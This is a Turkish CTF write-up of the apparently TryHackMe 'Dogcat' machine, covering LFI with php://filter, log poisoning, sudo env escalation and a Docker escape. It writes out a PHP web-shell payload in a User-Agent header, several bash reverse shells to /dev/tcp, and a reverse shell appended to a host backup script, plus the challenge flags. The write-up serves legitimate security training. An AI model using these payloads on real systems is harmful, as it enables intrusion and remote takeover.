<img width="1280" height="720" alt="tFclZGq" src="https://github.com/user-attachments/assets/25ad71d5-3202-4cee-848e-1aed0c690694" />

Dogcat, adından da anlaşılacağı gibi köpek ve kedi resimleri gösteren basit bir PHP uygulaması ama arkasında oldukça öğretici bir zincir saklıyor. LFI ile başlayıp log poisoning üzerinden RCE'ye, oradan `sudo` yanlış yapılandırmasıyla root'a, en sonunda da bir Docker container'ından host makineye kaçışa kadar giden dört flag'li bir makine. Aşağıda tüm süreci adım adım anlatıyorum.

## 1. Keşif

İlk adım her zaman olduğu gibi tam port taraması:

```bash
nmap -sS -A -p- -T4 10.114.144.39
```
<img width="675" height="210" alt="nmap" src="https://github.com/user-attachments/assets/c5fb038c-eea7-48eb-99cd-62d1edc73d15" />

## 2. Web Uygulamasını İnceleme

80 portuna gidince karşımı basit bir arayüz karşıladı: bir köpek butonu, bir kedi butonu. Butonlara tıklayınca ilgili resim çağrılıyor:

```
http://10.114.144.39/?view=cat
http://10.114.144.39/?view=dog
```
<img width="683" height="650" alt="site" src="https://github.com/user-attachments/assets/466f1392-3e5b-4146-8902-905649145062" />

`view` parametresinin sonuna `.php` eklemeyi denediğimde şu hatayı aldım:

```
Warning: include(cat.php.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
```

Bu hata, sunucunun `view` parametresine otomatik olarak `.php` uzantısı eklediğini gösteriyordu — klasik bir LFI belirtisi. Bunu doğrulamak için PayloadsAllTheThings'teki PHP wrapper tekniklerine baktım:

```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md
```

`php://filter` wrapper'ı ile dosya içeriğini base64 olarak okuyabileceğimi gördüm. Bunu bir kenara not edip önce ffuf ile dizin taraması attım:

```bash
ffuf -u http://10.114.144.39/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt,.bak,.zip -c
```
<img width="815" height="158" alt="ffuf" src="https://github.com/user-attachments/assets/9f53511d-a038-439e-b535-3f9fd1bfcf90" />

`flag.php` diye bir dosya olması işaret fişeği gibiydi.

## 3. LFI ile Kaynak Kod ve Flag Okuma

`view` parametresine `php://filter` wrapper'ını verdim:

```
http://10.114.144.39/?view=php://filter/convert.base64-encode/resource=cat
```

<img width="720" height="343" alt="catbase64" src="https://github.com/user-attachments/assets/fab13107-1272-49bb-8635-b08aba7689ab" />


Dönen base64:

```
PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
```

Decode edince:

```php
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```

Yani `cat.php` sadece rastgele bir resim çağıran bir dosyaymış. LFI'nin çalıştığını doğruladıktan sonra `flag.php`'yi okumaya geçtim, path traversal ile:

```
http://10.114.144.39/?view=php://filter/convert.base64-encode/resource=cats/../flag
```

<img width="753" height="288" alt="flagtxt" src="https://github.com/user-attachments/assets/6766d8e4-9a29-4afa-a82f-534111e1df1f" />


Dönen base64:

```
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```

Decode edince ilk flag'i buldum:

```php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
```

## 4. Kaynak Kodu Okuma ve Filtre Bypass'ı

Sırada asıl uygulama dosyası `index.php` vardı:

```
http://10.114.144.39/?view=php://filter/convert.base64-encode/resource=dog/../index
```

<img width="1387" height="312" alt="indexbase64" src="https://github.com/user-attachments/assets/b332b3ad-bb79-45e2-8e1b-e39966fe9116" />


Base64'ü decode edince uygulamanın tam mantığını gördüm:

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
        if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
            echo 'Here you go!';
            include $_GET['view'] . $ext;
        } else {
            echo 'Sorry, only dogs or cats are allowed.';
        }
    }
?>
```

Buradaki mantık şuydu:

- `view` parametresi içinde "dog" veya "cat" kelimesi geçmesi yeterli — path traversal ile birleştirmek mümkün (örneğin `dog/../../../etc/passwd` string'i hâlâ içinde "dog" geçiriyor).
- `ext` parametresi varsa uygulama onu kullanıyor, yoksa varsayılan olarak `.php` ekliyor. Yani `&ext=` boş bırakılırsa uzantı eklenmeden istediğimiz dosyayı direkt okuyabiliyoruz.

Bu bilgiyle `/etc/passwd` dosyasını okumayı denedim:

```
http://10.114.144.39/?view=dog/../../../../../../../etc/passwd&ext
```

<img width="818" height="473" alt="etcpasswd" src="https://github.com/user-attachments/assets/c00b5ff3-f3fa-452f-9a84-0ec775e64e85" />


Ve sistem dosyasının tam içeriğini elde ettim:

```
Here you go!
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Artık sunucudaki herhangi bir dosyayı okuyabiliyordum.

## 5. Log Poisoning ile RCE

Apache çalıştığını bildiğim için log dosyalarını `User-Agent` header'ı üzerinden zehirleyip LFI'yi RCE'ye çevirmeye karar verdim. Burp ile isteği yakalayıp `User-Agent` alanına bir PHP payload'ı ekledim:

```
GET /?view=cat HTTP/1.1
Host: 10.114.144.39
User-Agent: Mozilla/5.0 <?php system($_GET[c]); ?> (X11; Linux x86_64) AppleWebKit/537.36 ...
```

Bu isteği gönderdikten sonra Apache access log'una PHP kodum enjekte olmuş oldu. Sonra log dosyasını `view` parametresi üzerinden çağırıp `c` parametresiyle komut çalıştırmayı denedim:

```
http://10.114.144.39/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=whoami
```

<img width="846" height="806" alt="wwwdata" src="https://github.com/user-attachments/assets/d35f671c-5606-4c2d-9517-a424aac8bf33" />


Çıktı olarak `www-data` döndü — komut çalıştırma başarılıydı. Ardından bir listener açtım:

```bash
nc -lvnp 4444
```

Ve reverse shell payload'ını gönderdim:

```
http://10.114.144.39/?view=dog/../../../../../../../var/log/apache2/access.log&ext=&c=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.134.19%2F4444%200%3E%261%27
```

Listener tarafında bağlantı düştü:

```
listening on [any] 4444 ...
connect to [192.168.134.19] from (UNKNOWN) [10.114.144.39] 60098
www-data@b8e52fd13cbb:/var/www/html$
```

## 6. İkinci Flag

`/var/www` dizininde ikinci flag'i buldum:

```
www-data@b8e52fd13cbb:/var/www$ ls
flag2_QMW7JvaY2LvK.txt
www-data@b8e52fd13cbb:/var/www$ cat flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```

<img width="505" height="113" alt="flag2" src="https://github.com/user-attachments/assets/fcd18974-5f90-4824-9908-40defb10357c" />


## 7. Privilege Escalation — sudo env

Root olmak için önce sudo yetkilerime baktım:

```bash
sudo -l
```

<img width="696" height="338" alt="root+flag3" src="https://github.com/user-attachments/assets/fa40eeef-8d29-45aa-99d0-32acfa801c17" />


`env` komutunun root yetkisiyle şifresiz çalıştırılabildiğini görünce direkt GTFOBins'e baktım. Orada önerilen teknik basitti:

```bash
sudo env /bin/sh
```

Bu komutu çalıştırınca root shell elde ettim:

```
whoami
root
```

## 8. Üçüncü Flag

```bash
cd /root
ls
flag3.txt
cat flag3.txt
```

```
THM{D1ff3r3nt_3nv1ronments_874112}
```

## 9. Docker Container'dan Kaçış

Makinenin görev açıklamasında Docker'a dair bir ipucu vardı, bu yüzden ortamı biraz daha inceledim:

```bash
ls -la
```

<img width="477" height="393" alt="dockerenv" src="https://github.com/user-attachments/assets/ffa6db45-f46f-483c-a62c-93f8836b5cae" />


`.dockerenv` dosyasının varlığı, aslında root olduğum yerin host makine değil bir Docker container'ı olduğunu doğruladı. Sistemde gezinirken `/opt` altında bir backup dizinine rastladım:

```bash
cat backup.sh
```

<img width="461" height="112" alt="backupsh" src="https://github.com/user-attachments/assets/702f408d-a1bb-4d92-8873-ba853546e2a3" />


Bu script'in host tarafında (muhtemelen bir cron job ile) periyodik olarak çalıştırıldığını düşünerek, kendi reverse shell komutumu script'in sonuna eklemeye karar verdim:

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.134.19/4445 0>&1'" >> backup.sh
```

Yeni bir listener açtım:

```bash
nc -lvnp 4445
```

Kısa bir süre sonra bağlantı düştü — bu sefer container'ın dışından, host makineden:

```
listening on [any] 4445 ...
connect to [192.168.134.19] from (UNKNOWN) [10.114.144.39] 41572
root@dogcat:~#
```

## 10. Dördüncü ve Son Flag

```bash
cat flag4.txt

THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```
<img width="647" height="212" alt="flag4" src="https://github.com/user-attachments/assets/44d1f3e4-bc70-4c08-834e-93a54a9618ad" />
